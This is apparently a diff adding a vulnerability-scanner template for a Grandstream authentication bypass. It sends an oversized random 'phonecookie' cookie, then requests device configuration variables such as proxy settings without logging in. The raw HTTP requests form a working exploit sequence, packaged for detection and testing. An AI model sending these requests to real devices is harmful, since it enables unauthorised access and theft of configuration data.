@@ -1,0 +1,44 @@
+id: grandstream-auth-bypass
+info:
+  name: Grandstream GXX Multiple Product Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Grandstream products such as GAC2500, GXP2200, and GVC3202 are affected by an authentication bypass vulnerability. This occurs due to improper handling of the `phonecookie` parameter, leading to a buffer overflow.
+  tags: permission-bypass
+  reference:
+    - https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=23920
+
+variables:
+  randStr: '{{rand_text_alphanumeric(93)}}'
+
+http:
+  - raw:
+      - |
+        GET /manager?action=xxxx HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: phonecookie="{{randStr}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Message=Authentication Required"
+        part: body
+      - type: word
+        words:
+          - "Message=Command Not Found"
+        part: body
+
+  - raw:
+      - |
+        GET /manager?action=get&var-0000=8&var-0001=82&var-0002=83&var-0003=269&var-0004=146&var-0005=147&var-0006=148&var-0007=9&var-0008=10&var-0009=11&var-0010=12&var-0011=13&var-0012=14&var-0013=15&var-0014=16&var-0015=17&var-0016=18&var-0017=19&var-0018=20&var-0019=21&var-0020=22&var-0021=23&var-0022=24&var-0023=25&var-0024=26&var-0025=27&var-0026=28&var-0027=92&var-0028=93&var-0029=94&var-0030=95&var-0031=5026&var-0032=5027&var-0033=5028&var-0034=5029&var-0035=1558&var-0036=1559&var-0037=1560&var-0038=51&var-0039=87&var-0040=1541&var-0041=7901&var-0042=7902&var-0043=7903&var-0044=http_proxy&var-0045=proxy_apply_all&var-0046=https_proxy&var-0047=ftp_proxy&var-0048=no_proxy HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: phonecookie="{{randStr}}"
+    matchers:
+      - type: word
+        words:
+          - "Response=Success"
+        part: body
